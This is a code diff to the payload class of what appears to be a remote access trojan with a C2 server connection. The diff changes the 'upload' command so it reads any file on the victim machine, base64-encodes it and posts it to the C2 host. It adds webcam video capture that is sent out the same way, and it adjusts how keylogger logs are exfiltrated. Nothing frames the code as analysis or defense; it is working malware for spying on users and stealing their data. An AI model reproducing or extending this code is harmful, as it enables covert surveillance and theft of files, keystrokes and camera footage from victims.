@@ -566,23 +566,25 @@ class Payload():
             return "{} error: {}".format(self.imgur.func_name, str(e2))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
-    def upload(self, args):
+    def upload(self, filename):
         """ 
-        Upload file to an FTP server, Imgur, or Pastebin
+        Upload file from client machine to the C2 server
 
         `Required`
-        :param str mode:      ftp, imgur, pastebin
-        :param str source:    data or filename
+        :param str source:      filename
 
         """
         try:
-            mode, _, source = str(args).partition(' ')
-            if not source:
-                return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
-            elif mode not in ('ftp','imgur','pastebin'):
-                return "{} error: invalid mode '{}'".format(self.upload.func_name, str(mode))
+            if os.path.isfile(filename):
+                host, port = self.connection.getpeername()
+                _, filetype = os.path.splitext(filename)
+                with open(filename, 'rb') as fp:
+                    source = base64.b64encode(fp.read())
+                data = {filetype: source}
+                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                return "Upload complete"
             else:
-                return getattr(self, mode)(source)
+                return "Error: file not found"
         except Exception as e:
             log("{} error: {}".format(self.upload.func_name, str(e)))
             return "Error: {}".format(str(e))
@@ -632,11 +634,16 @@ class Payload():
             elif 'image' in args:
                 img = globals()['webcam'].image(*args)
                 data = {"png": img}
-                host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+            elif 'video' in args:
+                vid = globals()['webcam'].video(*args)
+                data = {"avi": vid}
+            else:
+                return self.webcam.usage
+            host, port = self.connection.getpeername()
+            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+            return "Webcam capture complete"
         except Exception as e:
             log("{} error: {}".format(self.webcam.func_name, str(e)))
-        return "Webcam capture complete"
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
     def passive(self):
@@ -831,7 +838,7 @@ class Payload():
                 mode = 'stopped'
                 if 'keylogger' in self.handlers:
                     mode = 'running'
-                update = status(float(self.handlers.get('keylogger').name))
+                update = globals()['status'](float(self.handlers.get('keylogger').name))
                 length = globals()['keylogger']._buffer.tell()
                 return "Status\n\tname: keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(mode, update, length)
             except Exception as e:
@@ -861,7 +868,7 @@ class Payload():
             elif 'upload' in mode:
                 data = base64.b64encode(globals()['keylogger'].logs.getvalue())
                 host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port + 3), json={'data': data})
+                globals()['post']('http://{}:{}'.format(host, port + 3), json={'txt': data})
                 globals()['keylogger'].logs.reset()
                 return 'Upload complete'
             elif 'status' in mode:
